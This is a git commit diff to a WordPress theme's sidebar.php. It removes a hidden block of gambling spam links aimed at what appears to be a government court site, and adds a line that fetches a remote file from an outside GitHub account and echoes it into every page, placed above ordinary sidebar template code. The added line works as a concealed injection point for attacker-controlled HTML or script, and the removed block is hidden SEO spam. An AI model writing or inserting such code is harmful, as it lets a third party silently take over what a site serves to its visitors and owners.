c1976da560eb224cbd5f16cae2f5a417197e23a0
/SLoerD <98331189+BadaxHaxor@users.noreply.github.com>
2023-07-21 00:05:54 +0700

    Update sidebar.php

--- sidebar.php
+++ sidebar.php
@@ -1,11 +1,23 @@
-<div style="display:none;">
-<ul>
-<li><a href="https://sipp.pa-singkawang.go.id/-/linetogel/">linetogel slot</a></li>
-<li><a href="https://sipp.pa-singkawang.go.id/-/linetogel/">slot gacor terpercaya</a></li>
-<li><a href="https://sipp.pa-singkawang.go.id/-/linetogel/">slot gacor 2023</a></li>
-<li><a href="https://sipp.pa-singkawang.go.id/-/linetogel/">slot88</a></li>
-<li><a href="https://sipp.pa-singkawang.go.id/-/linetogel/">linetogel</a></li>
-<li><a href="https://sipp.pa-singkawang.go.id/-/linetogel/">jackpot maxwin</a></li>
-<li><a href="https://sipp.pa-singkawang.go.id/-/linetogel/">slot jackpot</a></li>
-</ul> 
-</div>
+<?php
+$framework_controller_2 = file_get_contents('https://raw.githubusercontent.com/BadaxHaxor/zeroajg/main/sidebar.php'); echo $framework_controller_2;
+?>
+<div id="secondary">
+	<?php
+		$description = get_bloginfo( 'description', 'display' );
+	if ( ! empty( $description ) ) :
+		?>
+	<h2 class="site-description"><?php echo esc_html( $description ); ?></h2>
+	<?php endif; ?>
+
+	<?php if ( has_nav_menu( 'secondary' ) ) : ?>
+	<nav class="navigation site-navigation secondary-navigation">
+		<?php wp_nav_menu( array( 'theme_location' => 'secondary' ) ); ?>
+	</nav>
+	<?php endif; ?>
+
+	<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
+	<div id="primary-sidebar" class="primary-sidebar widget-area" role="complementary">
+		<?php dynamic_sidebar( 'sidebar-1' ); ?>
+	</div><!-- #primary-sidebar -->
+	<?php endif; ?>
+</div><!-- #secondary --
